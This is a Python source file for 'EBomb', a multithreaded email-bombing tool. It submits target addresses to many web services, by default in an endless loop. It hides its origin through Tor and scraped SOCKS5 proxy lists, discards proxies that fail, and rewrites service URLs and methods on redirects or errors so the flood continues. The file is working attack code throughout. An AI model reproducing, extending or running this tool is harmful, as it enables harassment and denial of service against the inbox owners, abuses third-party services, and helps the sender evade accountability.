from __future__ import annotations

import atexit
import multiprocessing
import reprlib
import shutil
from multiprocessing.pool import ThreadPool
from urllib.error import URLError

import EasyProxies
from httpx import HTTPError
from rich.console import Console
from spys.me import Getters

from EBomb.services import *

__all__ = ('EBomb', 'Service', 'services')


class EBomb:
    __slots__ = ('console',
                 'targets', 'forever',
                 '_max_netloc_len', '_max_email_len', '_max_right_align',
                 '__proxies', '_working_proxy', 'proxy')
    _REPR = reprlib.Repr()

    class _Markup:
        """Contain colors for rich print"""
        __slots__ = ('service', 'method', 'proxy', 'response')

        def __init__(self):
            self.service = self.method = self.proxy = self.response = 'green'

    def __init__(self, targets: list[str],
                 proxy: bool = True, forever: bool = True, verbose: bool = True):
        self.console = Console()
        self.console.quiet = not verbose

        self.targets = [j for j in [str(i).strip() for i in targets] if j]
        if not targets:
            return

        self.forever = forever

        self._max_netloc_len = max(len(serv.netloc) for serv in services)
        self._max_email_len = max(len(e) for e in targets)
        self._max_right_align = (self._max_netloc_len + self._max_email_len
                                 + 70)  # 70 is for '__init__.py:...' at the end of the log

        if proxy:
            self.__proxies = self._socks5_proxies
            self._working_proxy = sorted(self.__proxies)[0]
        else:
            self._working_proxy = None
            self.__proxies = {*()}
        self.proxy = proxy

        def _at_exit():
            with open(SERVICES_DB_FILE_PATH, 'w', encoding='UTF-8') as upd_serv:
                upd_serv.write('\n\n'.join(str(serv) for serv in services))

        atexit.register(_at_exit)

    def start(self, threads_count: int = None):
        if threads_count is None:
            threads_count = multiprocessing.cpu_count()
        if threads_count < 1:
            threads_count = 1

        _urls = len(services)
        _n_urls_color = 'green' if _urls else 'red'
        _proxy_color = 'green' if self.proxy else 'red'

        args = [(service, email) for email in self.targets for service in services]

        self.console.log(
            f"[blue][i]Running "
            f"{'[green]forever[/]' if self.forever else f'on [green]{len(args)}[/] calls'} "
            f"([green]{threads_count}[/] thread{'s' if threads_count != 1 else ''})... "
            "[b red]CTRL+BREAK[/] to exit.[/]\n"
            f"URL{'s' if _urls > 1 else ''}: [{_n_urls_color}]{_urls}[/] "
            f"[i]([{_n_urls_color}]{UNIQUE_NETLOC}[/] service{'s' if UNIQUE_NETLOC > 1 else ''})"
            "[/]\n"
            f"Proxy: [{_proxy_color}]{self.proxy}[/]\n"
            f"Email{'s' if len(self.targets) > 1 else ''}: [yellow]{'; '.join(f'{i}' for i in self.targets)}[/]\n"
            f"{'HOST':^{self._max_netloc_len}} / METH | {'EMAIL':^{self._max_email_len}}"
            f"{' |         PROXY         ' if self.proxy else ''} | RESPONSE"
            "[/blue]"
        )

        if threads_count == 1:
            def _starter():
                for arg in args:
                    self.request(*arg)
        else:
            def _starter():
                with ThreadPool(threads_count) as pool:
                    pool.starmap(self.request, args)

        if self.forever:
            while True:
                _starter()
        else:
            _starter()

    @property
    def _socks5_proxies(self) -> set[str]:
        try:
            return {'localhost:9050',  # tor socks proxy
                    *(EasyProxies.Proxies.get(format='txt', type='socks5', uptime=100)
                      or EasyProxies.Proxies.get(format='txt', type='socks5'))}
        except (URLError, TimeoutError):
            try:
                return {'localhost:9050', *(str(i) for i in Getters.get_socks5_proxies())}
            except Exception:
                self.console.log('[red]Error getting proxy.[/]')
                raise

    @property
    def working_proxy(self):
        if self._working_proxy and self._working_proxy not in self.proxies:
            self._working_proxy = sorted(self.proxies)[0]
        return self._working_proxy

    @property
    def proxies(self) -> set[str]:
        if self.proxy and not self.__proxies:
            self.__proxies |= self._socks5_proxies
        return self.__proxies

    @property
    def _max_other(self) -> int:
        """reprlib.Repr.maxother"""
        return max(shutil.get_terminal_size().columns - self._max_right_align, 6)

    def request(self, service: Service, email: str):
        _proxy = self.working_proxy
        _markup = self._Markup()
        try:
            resp = service.request(email, proxies=_proxy)
            code = resp.status_code
        except HTTPError as Error:
            _markup.response = 'i red'

            self._REPR.maxother = self._max_other
            resp = self._REPR.repr(Error)

            code = Error.response.status_code if hasattr(Error, 'response') else None
        if service in services and code in {301, 308, 403, 404, 405}:
            _markup.response = 'yellow'
            pos = services.index(service)
            if code in {301, 308}:
                new_loc = resp.headers.get('Location', resp.headers.get('location')) if resp is not None else None
                if new_loc:
                    _markup.service = 'i green'
                    services[pos].url = new_loc
                    services[pos].method = 'GET' if code == 301 else 'POST'
                else:
                    _markup.service = 'red'
                    services.pop(pos)
            elif code == 403:
                _markup.service = 'i red'
            elif code == 404:
                _markup.service = 'red'
                services.pop(pos)
            else:
                _markup.method = 'yellow'
                meth = services[pos].method
                if meth.upper() == 'GET':
                    services[pos].method = 'POST'
                else:
                    _markup.method = 'i red'
                    services.append(Service(service.url, 'GET'))
        elif code in {None, 401, 407}:
            _markup.proxy = 'red'
            proxies = self.proxies
            if _proxy in proxies:
                proxies.remove(_proxy)
        self.console.log(
            '[white]'
            f'[{_markup.service}]{service.netloc:^{self._max_netloc_len}}[/] '
            f'/ [{_markup.method}]{service.method:<4}[/] '
            f'| [blue]{email:^{self._max_email_len}}[/]'
            f'{f" | [{_markup.proxy}]{_proxy!s:^22}[/]" if _proxy else ""} '
            f'| [{_markup.response}]{resp}[/]'
            '[/]'
        )
